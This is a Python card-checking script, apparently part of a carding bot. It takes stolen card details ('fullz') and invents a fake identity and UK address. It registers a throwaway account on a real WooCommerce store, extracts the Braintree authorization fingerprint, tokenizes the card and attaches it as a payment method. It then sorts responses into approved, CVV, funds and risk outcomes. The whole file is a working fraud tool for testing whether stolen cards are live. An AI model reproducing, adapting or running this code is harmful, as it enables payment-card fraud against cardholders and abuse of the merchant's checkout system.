import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
import random
import string
import re
from bs4 import BeautifulSoup
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote
from urllib.parse import urlparse, parse_qs
import user_agent

import requests
def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
 
 
                return None


from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)






user = user_agent.generate_user_agent()
r = requests.session()
r.follow_redirects = True
r.verify = False



async def create_braintree_auth(fullz , session):
    try:

        cc, mes, ano, cvv = fullz.split("|")








        def generate_full_name():
            first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                        "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan"]
            last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams"]
            full_name = random.choice(first_names) + " " + random.choice(last_names)
            first_name, last_name = full_name.split()
            return first_name, last_name

        def generate_address():
            cities = ["London", "Birmingham", "Manchester", "Liverpool"]
            states = ["England", "England", "England", "England"]
            streets = ["Baker St", "Oxford St", "High St", "King's Rd"]
            zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG"]
            city = random.choice(cities)
            state = states[cities.index(city)]
            street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
            zip_code = zip_codes[states.index(state)]
            return city, state, street_address, zip_code

        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()

        def generate_random_account():
            name = ''.join(random.choices(string.ascii_lowercase, k=20))
            number = ''.join(random.choices(string.digits, k=4))
            return f"{name}{number}@gmail.com"

        acc = generate_random_account()

        def username():
            name = ''.join(random.choices(string.ascii_lowercase, k=20))
            number = ''.join(random.choices(string.digits, k=20))
            return f"{name}{number}"

        username = username()

        def num():
            number = ''.join(random.choices(string.digits, k=7))
            return f"303{number}"

        num = num()

        def generate_random_code(length=32):
            letters_and_digits = string.ascii_letters + string.digits
            return ''.join(random.choice(letters_and_digits) for _ in range(length))

        corr = generate_random_code()
        sess = generate_random_code()

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'referer': 'https://www.bebebrands.com/wp-login.php?action=logout&redirect_to=https%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2F&_wpnonce=936b75e2b6',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = requests.get('https://www.bebebrands.com/my-account/', headers=headers)
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        data = {
            'username': username,
            'email': acc,
            'password': 'Sa147258369Lah@#',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': 'https://www.bebebrands.com/my-account/edit-address/billing/',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.bebebrands.com/my-account/edit-address/',
            'wc_order_attribution_session_start_time': '2025-03-28 14:24:48',
            'wc_order_attribution_session_pages': '10',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        response = r.post('https://www.bebebrands.com/my-account/', headers=headers, data=data)



        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'referer': 'https://www.bebebrands.com/my-account/edit-address/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers)
        address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/edit-address/billing/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_company': '',
            'billing_country': 'GB',
            'billing_address_1': street_address,
            'billing_address_2': '',
            'billing_city': city,
            'billing_state': '',
            'billing_postcode': zip_code,
            'billing_phone': num,
            'billing_email': acc,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }

        response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)



        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'referer': 'https://www.bebebrands.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
        client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)



        headers = {
            'authority': 'www.bebebrands.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client,
        }

        response = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        enc = response.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'a6431654-b18e-4ee5-b5df-248ff3a293fd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = response.json()['data']['tokenizeCreditCard']['token']
        if tok:
            print('Extracted Successfully ✅   ')
            print("\033[1;37m—" * 60)
        else:
            print('Extracted Failed ❌   ')


        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'master-card'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', tok),
            ('wc_braintree_device_data', '{"correlation_id":"28b5d5b50afc7b55d31519b3cbeea91c"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_device_data', '{"correlation_id":"28b5d5b50afc7b55d31519b3cbeea91c"}'),
            ('wc-braintree-paypal-context', 'shortcode'),
            ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'GBP'),
            ('wc_braintree_paypal_locale', 'en_gb'),
            ('wc-braintree-paypal-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', add_nonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data)

        text = response.text
        pattern = r'Status code (.*?)\s*</li>'
        match = re.search(pattern, text)
        if match:
            result = match.group(1)
            if 'risk_threshold' in text:
                result = "RISK: Retry this BIN later."
        else:
            if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
                result = "1000: Approved"
            else:
                result = "Error"

        if 'funds' in result or 'Card Issuer Declined CVV' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
            print(result)
        else:
            print(result)
        time.sleep(14)

        return response.text



    except Exception as e:
        return str(e)
